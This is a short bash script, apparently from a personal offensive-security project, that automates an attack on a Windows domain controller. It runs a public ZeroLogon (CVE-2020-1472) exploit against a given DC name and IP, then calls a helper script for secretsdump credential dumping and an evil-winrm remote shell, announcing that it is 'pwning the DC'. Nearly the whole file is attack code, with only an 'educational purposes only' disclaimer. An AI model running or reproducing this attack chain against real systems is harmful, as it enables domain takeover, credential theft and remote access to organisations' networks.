#! /bin/bash
#NOTE:This file and others in this project are still under construction, if you wish to use this script to learn please change the paths to ones that will work for you
#Disclaimers: This project is for educational purposes only and is not to be used in any malicious fasion.
cat resources/art.txt
#Variable and error decleration.
Domain=${1?Eror please enter a Domain name}
export Domain2=$Domain
DcName=${2?Error Please enter a valid DC-computer name}
export DcName2=$DcName
ipAddrs=${3?Error Please enter a valid IPv4 Address}
export ipAddrs2=$ipAddrs
count=1
dot="."
echo "Welcome, Please be patient while the code handles pwning the DC..."
#bash script to call public exploit
python3 /home/kali/Desktop/ZeroLogon/weaponised/CVE-2020-1472/cve-2020-1472-exploit.py $DcName $ipAddrs
#calling the script to run secrets dump and evil-winrm (Seperate script as it didnt work in one).
/home/kali/Desktop/ZeroLogon/exploitkit/dumpthis.sh
